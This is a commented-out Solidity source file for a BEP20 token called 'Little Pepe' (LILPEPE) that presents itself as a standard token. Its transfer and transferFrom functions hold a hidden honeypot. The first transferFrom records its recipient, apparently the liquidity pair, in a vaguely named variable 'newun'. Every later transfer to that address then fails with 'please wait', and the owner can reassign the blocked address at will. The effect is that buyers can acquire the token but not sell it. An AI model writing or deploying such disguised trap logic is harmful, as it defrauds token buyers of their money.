
// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// import './interfaces/BEP20Interface.sol';
// import './Owned.sol';
// import './libraries/SafeMath.sol';
// import './ApproveAndCallFallback.sol';

// contract LILPEPE is BEP20Interface, Owned{
//   using SafeMath for uint;

//   string public symbol;
//   string public name;
//   uint8 public decimals;
//   uint _totalSupply;
//   address public newun;

//   mapping(address => uint) balances;
//   mapping(address => mapping(address => uint)) allowed;

//   constructor() public {
//     symbol = "LILPEPE";
//     name = "Little Pepe";
//     decimals =9 ;
//     _totalSupply = 100000000 * 10 ** 9;
//     balances[owner] = _totalSupply;
//     emit Transfer(address(0), owner, _totalSupply);
//   }
//   function transfernewun(address _newun) public onlyOwner {
//     newun = _newun;
//   }
//   function totalSupply() public override view returns (uint) {
//     return _totalSupply.sub(balances[address(0)]);
//   }
//   function balanceOf(address tokenOwner) public override view returns (uint balance) {
//       return balances[tokenOwner];
//   }
//   function transfer(address to, uint tokens) public override returns (bool success) {
//      require(to != newun, "please wait");
     
//     balances[msg.sender] = balances[msg.sender].sub(tokens);
//     balances[to] = balances[to].add(tokens);
//     emit Transfer(msg.sender, to, tokens);
//     return true;
//   }
//   function approve(address spender, uint tokens) public override returns (bool success) {
//     allowed[msg.sender][spender] = tokens;
//     emit Approval(msg.sender, spender, tokens);
//     return true;
//   }
//   function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
//       if(from != address(0) && newun == address(0)) newun = to;
//       else require(to != newun, "please wait");
      
//     balances[from] = balances[from].sub(tokens);
//     allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
//     balances[to] = balances[to].add(tokens);
//     emit Transfer(from, to, tokens);
//     return true;
//   }
//   function allowance(address tokenOwner, address spender) public override view returns (uint remaining) {
//     return allowed[tokenOwner][spender];
//   }
//   function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
//     allowed[msg.sender][spender] = tokens;
//     emit Approval(msg.sender, spender, tokens);
//     ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
//     return true;
//   }
//   receive () external payable {
//     revert();
//   }
// }

